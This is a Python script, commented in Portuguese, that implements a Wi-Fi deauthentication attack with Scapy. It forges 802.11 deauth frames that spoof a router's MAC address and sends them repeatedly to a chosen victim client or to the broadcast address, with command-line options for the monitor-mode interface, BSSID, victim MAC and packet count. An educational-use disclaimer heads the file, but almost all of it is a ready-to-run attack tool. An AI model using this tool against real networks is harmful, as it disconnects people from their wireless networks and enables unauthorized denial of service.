#!/usr/bin/env python3
# =====================================================================
# AVISO LEGAL:
# Ferramenta de Ataque Deauth (Desautenticação Wi-Fi).
# Uso estritamente educacional. Teste apenas em redes de sua propriedade.
# =====================================================================
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from colorama import Fore, init
import argparse
import time
import sys

init(autoreset=True)

def ataque_deauth(interface, bssid, cliente, quantidade):
    print(Fore.CYAN + f"[*] Iniciando ataque Deauth...")
    print(f"[*] Interface: {interface}")
    print(f"[*] Roteador (BSSID): {bssid}")
    print(f"[*] Vítima: {cliente}")
    print(Fore.YELLOW + "[*] Pressione Ctrl+C para parar.\n")

    # Monta a estrutura do pacote Wi-Fi
    # 1. RadioTap: Camada física (a placa de rede preenche os dados de canal)
    # 2. Dot11: Cabeçalho MAC.
    #    addr1 = Destino (a vítima)
    #    addr2 = Transmissor (o roteador, mas nós estamos falsificando)
    #    addr3 = BSSID (o MAC do roteador)
    dot11 = Dot11(addr1=cliente, addr2=bssid, addr3=bssid)
    
    # 3. Dot11Deauth: O frame de desautenticação.
    #    reason=7 significa "Class 3 frame received from nonassociated station" (motivo clássico).
    pacote = RadioTap() / dot11 / Dot11Deauth(reason=7)

    try:
        for i in range(quantidade):
            # sendp envia na Camada 2 (Ethernet/Wi-Fi), não na Camada 3 (IP)
            sendp(pacote, iface=interface, verbose=False)
            print(Fore.GREEN + f"[+] Pacote {i+1}/{quantidade} enviado!")
            
            # Um delay minúsculo para não sobrecarregar a placa
            time.sleep(0.1) 
            
        print(Fore.CYAN + "\n[*] Ataque finalizado.")

    except PermissionError:
        print(Fore.RED + "\n[-] Erro: Precisa de sudo (root).")
        sys.exit(1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Ataque interrompido pelo usuário (Ctrl+C).")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[-] Erro inesperado: {e}")
        print(Fore.YELLOW + "[!] Verifique se a interface está em modo monitor.")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ataque Deauth em Wi-Fi (Educacional)")
    parser.add_argument("-i", "--interface", required=True, help="Interface em modo monitor (ex: wlan0mon)")
    parser.add_argument("-b", "--bssid", required=True, help="MAC do roteador (AP)")
    parser.add_argument("-c", "--cliente", required=True, help="MAC da vítima (ou FF:FF:FF:FF:FF:FF para broadcast)")
    parser.add_argument("-n", "--num", type=int, default=50, help="Número de pacotes para enviar (padrão: 50)")
    
    args = parser.parse_args()
    
    ataque_deauth(args.interface, args.bssid, args.cliente, args.num)
